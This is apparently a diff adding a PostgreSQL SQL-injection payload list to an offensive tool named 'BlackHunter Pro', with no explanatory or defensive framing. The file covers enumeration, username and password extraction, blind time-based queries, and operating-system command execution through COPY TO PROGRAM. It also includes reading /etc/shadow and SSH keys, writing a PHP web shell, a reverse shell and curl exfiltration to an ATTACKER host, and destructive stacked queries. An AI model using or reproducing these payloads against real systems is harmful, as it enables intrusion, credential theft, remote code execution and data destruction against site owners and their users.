@@ -1,0 +1,229 @@
+# payloads/sqli/postgresql.txt
+# PostgreSQL-Specific SQL Injection Payloads
+# BlackHunter Pro
+
+# =============================================
+# VERSION DETECTION
+# =============================================
+
+' UNION SELECT version()--
+' AND 1=CAST(version() AS int)--
+' AND 1=CAST((SELECT version()) AS int)--
+' UNION SELECT current_setting('server_version')--
+' UNION SELECT current_setting('server_version_num')--
+' UNION SELECT current_setting('version')--
+' AND 1=(SELECT 1 FROM PG_SLEEP(0))--
+' AND 1=CAST(current_setting('server_version') AS int)--
+
+# =============================================
+# DATABASE INFO
+# =============================================
+
+' UNION SELECT current_database()--
+' UNION SELECT current_user--
+' UNION SELECT session_user--
+' UNION SELECT user--
+' UNION SELECT current_schema()--
+' UNION SELECT current_schemas(true)--
+' UNION SELECT inet_server_addr()--
+' UNION SELECT inet_server_port()--
+' UNION SELECT inet_client_addr()--
+' UNION SELECT pg_backend_pid()--
+' UNION SELECT pg_postmaster_start_time()--
+' UNION SELECT pg_conf_load_time()--
+' UNION SELECT current_setting('data_directory')--
+' UNION SELECT current_setting('config_file')--
+' UNION SELECT current_setting('hba_file')--
+' UNION SELECT current_setting('log_directory')--
+' UNION SELECT current_setting('port')--
+
+# =============================================
+# TABLE ENUMERATION
+# =============================================
+
+' UNION SELECT table_name FROM information_schema.tables--
+' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public'--
+' UNION SELECT table_name FROM information_schema.tables WHERE table_schema NOT IN ('pg_catalog','information_schema')--
+' UNION SELECT string_agg(table_name,',') FROM information_schema.tables--
+' UNION SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema NOT IN ('pg_catalog','information_schema')--
+' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1--
+' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET 1--
+' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET 2--
+' UNION SELECT table_name FROM pg_tables WHERE schemaname='public'--
+' UNION SELECT string_agg(tablename,',') FROM pg_tables WHERE schemaname='public'--
+
+# =============================================
+# COLUMN ENUMERATION
+# =============================================
+
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1--
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 1--
+' UNION SELECT string_agg(column_name||':'||data_type,',') FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' AND table_schema='public'--
+' UNION SELECT attname FROM pg_attribute WHERE attrelid=(SELECT oid FROM pg_class WHERE relname='users') AND attnum>0--
+' UNION SELECT string_agg(attname,',') FROM pg_attribute WHERE attrelid=(SELECT oid FROM pg_class WHERE relname='users') AND attnum>0--
+
+# =============================================
+# DATA EXTRACTION
+# =============================================
+
+' UNION SELECT username FROM users--
+' UNION SELECT username,password FROM users--
+' UNION SELECT username||':'||password FROM users--
+' UNION SELECT string_agg(username,',') FROM users--
+' UNION SELECT string_agg(username||':'||password,',') FROM users--
+' UNION SELECT username FROM users LIMIT 1--
+' UNION SELECT username FROM users LIMIT 1 OFFSET 1--
+' UNION SELECT username,password FROM users LIMIT 1--
+' UNION SELECT username FROM users WHERE username='admin'--
+' UNION SELECT username,password FROM users WHERE username='admin'--
+' UNION SELECT string_agg(username||':'||password,',') FROM users WHERE username='admin'--
+' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
+' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
+' AND 1=CAST((SELECT string_agg(username||':'||password,',') FROM users) AS int)--
+
+# =============================================
+# ERROR-BASED EXTRACTION
+# =============================================
+
+' AND 1=CAST(version() AS int)--
+' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--
+' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
+' AND 1=CAST((SELECT string_agg(username,',') FROM users) AS int)--
+' AND 1=CAST((SELECT string_agg(table_name,',') FROM information_schema.tables) AS int)--
+' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
+' AND 1=(SELECT 1 FROM CAST((SELECT username FROM users LIMIT 1) AS int))--
+
+# =============================================
+# TIME-BASED
+# =============================================
+
+' AND pg_sleep(5)--
+' AND pg_sleep(5)#
+'; SELECT pg_sleep(5)--
+'; SELECT pg_sleep(5)-- -
+1' AND pg_sleep(5)--
+1 AND pg_sleep(5)--
+' AND (SELECT 1 FROM PG_SLEEP(5))--
+' AND 1=(SELECT 1 FROM PG_SLEEP(5))--
+' AND 1=(SELECT 1 FROM PG_SLEEP(5)) IS NOT NULL--
+' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
+' AND (SELECT CASE WHEN (1=2) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
+' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN pg_sleep(5) ELSE pg_sleep(0) END)--
+' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM users)=0 THEN pg_sleep(5) ELSE pg_sleep(0) END)--
+' AND (SELECT CASE WHEN (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' THEN pg_sleep(5) ELSE pg_sleep(0) END)--
+' AND (SELECT CASE WHEN (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='b' THEN pg_sleep(5) ELSE pg_sleep(0) END)--
+' AND 1=(SELECT 1 FROM PG_SLEEP(5)) AND '1'='1
+' AND 1=(SELECT 1 FROM PG_SLEEP(5)) AND '1'='2
+' OR 1=(SELECT 1 FROM PG_SLEEP(5))--
+' AND 1=(SELECT 1 FROM PG_SLEEP(5) WHERE 1=1)--
+' AND (SELECT 1 FROM PG_SLEEP(5)) IS NOT NULL--
+
+# =============================================
+# COMMAND EXECUTION
+# =============================================
+
+'; COPY (SELECT '') TO PROGRAM 'id > /tmp/out'--
+'; COPY (SELECT '') TO PROGRAM 'whoami'--
+'; COPY (SELECT '') TO PROGRAM 'curl http://ATTACKER/'--
+'; COPY (SELECT '') TO PROGRAM 'nslookup ATTACKER'--
+'; COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"'--
+'; CREATE TABLE cmd_exec(cmd_output text)--
+'; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'--
+'; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'cat /etc/passwd'--
+'; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'ls -la /var/www/html'--
+'; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec;--
+'; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'cat /etc/passwd'; SELECT * FROM cmd_exec;--
+'; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'ls -la'; SELECT * FROM cmd_exec;--
+
+# =============================================
+# FILE OPERATIONS
+# =============================================
+
+' UNION SELECT pg_read_file('/etc/passwd')--
+' UNION SELECT pg_read_file('/etc/passwd',0,1000)--
+' UNION SELECT pg_read_file('/etc/shadow')--
+' UNION SELECT pg_read_file('/etc/hosts')--
+' UNION SELECT pg_read_file('/var/www/html/config.php')--
+' UNION SELECT pg_read_file('/root/.ssh/id_rsa')--
+' UNION SELECT pg_read_file('/root/.bash_history')--
+' UNION SELECT pg_ls_dir('/etc')--
+' UNION SELECT pg_ls_dir('/var/www/html')--
+' UNION SELECT pg_ls_dir('/home')--
+' UNION SELECT pg_ls_dir('/tmp')--
+' UNION SELECT string_agg(pg_ls_dir,',') FROM pg_ls_dir('/etc') AS pg_ls_dir--
+' UNION SELECT string_agg(pg_read_file('/etc/passwd'),',')--
+' UNION SELECT pg_read_binary_file('/etc/passwd')--
+
+# =============================================
+# WRITE FILE (via COPY)
+# =============================================
+
+'; COPY (SELECT '<?php system($_GET["c"]); ?>') TO '/var/www/html/shell.php'--
+'; COPY (SELECT '<?php system($_GET["c"]); ?>') TO '/tmp/shell.php'--
+'; COPY (SELECT '') TO '/var/www/html/shell.php'--
+'; COPY (SELECT 'test') TO '/tmp/test.txt'--
+
+# =============================================
+# OOB (OUT-OF-BAND) VIA DNS
+# =============================================
+
+'; COPY (SELECT '') TO PROGRAM 'nslookup ATTACKER'--
+'; COPY (SELECT '') TO PROGRAM 'curl http://ATTACKER/'--
+'; CREATE TABLE x(y text); COPY x FROM PROGRAM 'curl http://ATTACKER/'--
+'; CREATE TABLE x(y text); COPY x FROM PROGRAM 'nslookup $(whoami).ATTACKER'--
+'; CREATE TABLE x(y text); COPY x FROM PROGRAM 'nslookup $(cat /etc/passwd | base64 | head -1).ATTACKER'--
+'; DO $$ BEGIN PERFORM dblink('host=ATTACKER user=x dbname=x', 'SELECT 1'); END $$;--
+'; CREATE EXTENSION IF NOT EXISTS dblink; SELECT dblink('host=ATTACKER user=x dbname=x', 'SELECT 1');--
+
+# =============================================
+# PRIVILEGE ESCALATION
+# =============================================
+
+' UNION SELECT current_user--
+' UNION SELECT session_user--
+' UNION SELECT usename FROM pg_user--
+' UNION SELECT string_agg(usename,',') FROM pg_user--
+' UNION SELECT usename||':'||passwd FROM pg_shadow--
+' UNION SELECT string_agg(usename||':'||passwd,',') FROM pg_shadow--
+' UNION SELECT usename FROM pg_user WHERE usesuper=true--
+' UNION SELECT usename FROM pg_user WHERE usecreatedb=true--
+' UNION SELECT rolname FROM pg_roles WHERE rolsuper=true--
+' UNION SELECT rolname FROM pg_roles WHERE rolcreaterole=true--
+' UNION SELECT rolname FROM pg_roles WHERE rolcreatedb=true--
+' UNION SELECT rolname FROM pg_roles WHERE rolcanlogin=true--
+' UNION SELECT usename,usecreatedb,usesuper,usecreatedb FROM pg_user--
+
+# =============================================
+# STACKED QUERIES
+# =============================================
+
+'; UPDATE users SET password='hacked' WHERE username='admin'--
+'; INSERT INTO users VALUES('hacker','password')--
+'; INSERT INTO users (username,password) VALUES ('hacker','password')--
+'; DELETE FROM users WHERE username='admin'--
+'; DROP TABLE users--
+'; CREATE TABLE shell(cmd text)--
+'; ALTER USER postgres WITH PASSWORD 'newpassword'--
+'; CREATE USER hacker WITH PASSWORD 'password' SUPERUSER--
+'; ALTER USER hacker WITH SUPERUSER--
+'; GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO hacker--
+'; COPY users TO '/tmp/users.csv'--
+'; COPY users TO PROGRAM 'curl -X POST -d @- http://ATTACKER/'--
+
+# =============================================
+# WAF BYPASS
+# =============================================
+
+' /*!50000UNION*/ /*!50000SELECT*/ NULL--
+' UNION/**/SELECT/**/NULL--
+' UNION%0ASELECT%0ANULL--
+' UNION%09SELECT%09NULL--
+' UNION(SELECT(NULL))--
+' %55NION %53ELECT NULL--
+' UNION SELECT/**/NULL--
+' UNION DISTINCT SELECT NULL--
+' UNION%23comment%0ASELECT NULL--
+' SE/**/LECT NULL--
